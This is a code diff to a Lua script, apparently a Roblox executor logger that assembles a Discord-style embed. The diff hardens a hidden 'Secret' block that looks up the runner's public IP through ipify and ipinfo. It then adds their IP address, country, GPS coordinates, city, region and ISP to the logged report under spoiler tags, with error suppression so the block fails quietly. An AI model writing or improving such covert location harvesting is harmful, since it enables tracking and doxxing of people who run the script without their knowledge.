@@ -186,28 +186,35 @@ else
 
     -- Check if the secret tab should be included
     if getgenv().ExecLogSecret then
-        local ip = game:HttpGet("https://api.ipify.org")
-        local iplink = "https://ipinfo.io/" .. ip .. "/json"
-        local ipinfo_json = game:HttpGet(iplink)
-        local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
-
-        table.insert(
-            data.embeds[1].fields,
-            {
-                ["name"] = "**`(🤫) Secret`**",
-                ["value"] = "||(👣) IP Address: " ..
-                    ipinfo_table.ip ..
-                        "||\n||(🌆) Country: " ..
-                            ipinfo_table.country ..
-                                "||\n||(🪟) GPS Location: " ..
-                                    ipinfo_table.loc ..
-                                        "||\n||(🏙️) City: " ..
-                                            ipinfo_table.city ..
-                                                "||\n||(🏡) Region: " ..
-                                                    ipinfo_table.region ..
-                                                        "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"
-            }
-        )
+        pcall(function()
+            local ip = game:HttpGet("https://api.ipify.org")
+            if type(ip) == "string" then
+                local iplink = "https://ipinfo.io/" .. ip .. "/json"
+                local ipinfo_json = game:HttpGet(iplink)
+                if type(ipinfo_json) == "string" then
+                    local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
+                    if type(ipinfo_table) == "table" then
+                        table.insert(
+                            data.embeds[1].fields,
+                            {
+                                ["name"] = "**`(🤫) Secret`**",
+                                ["value"] = "||(👣) IP Address: " ..
+                                    tostring(ipinfo_table.ip) ..
+                                        "||\n||(🌆) Country: " ..
+                                            tostring(ipinfo_table.country) ..
+                                                "||\n||(🪟) GPS Location: " ..
+                                                    tostring(ipinfo_table.loc) ..
+                                                        "||\n||(🏙️) City: " ..
+                                                            tostring(ipinfo_table.city) ..
+                                                                "||\n||(🏡) Region: " ..
+                                                                    tostring(ipinfo_table.region) ..
+                                                                        "||\n||(🪢) Hoster: " .. tostring(ipinfo_table.org) .. "||"
+                            }
+                        )
+                    end
+                end
+            end
+        end)
     end
 
     local newdata = game:GetService("HttpService"):JSONEncode(data)
